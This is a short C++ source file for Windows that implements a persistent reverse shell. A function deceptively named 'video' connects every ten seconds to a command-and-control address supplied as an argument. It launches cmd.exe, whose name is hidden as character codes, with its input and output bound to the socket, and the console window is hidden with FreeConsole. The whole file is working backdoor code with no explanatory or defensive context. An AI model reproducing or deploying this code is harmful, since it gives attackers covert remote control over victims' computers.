#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <bits/stdc++.h>
using namespace std;
#pragma comment(lib, "Ws2_32.lib")
void video(char* C2Server, int C2Port) {
	while(true) {
		Sleep(10000);
		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2,2), &version);
		mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
			char RecvData[1024];
			memset(RecvData, 0, sizeof(RecvData));
			if (recv(mySocket, RecvData, 1024, 0) <= 0) {
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else {
				char Process[] = {(char)99,(char)109,(char)100,(char)46,(char)69,(char)120,(char)69,'\0'};
				STARTUPINFO sinfo;
				PROCESS_INFORMATION pinfo;
				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
				CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);
				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);
				memset(RecvData, 0, sizeof(RecvData));
				if (recv(mySocket, RecvData, 1024, 0) <= 0) {
					closesocket(mySocket);
					WSACleanup();
				}
			}
		}
	}
}
int main(int argc, char **argv) {
	FreeConsole();
	video(argv[1],atoi(argv[2]));
} 
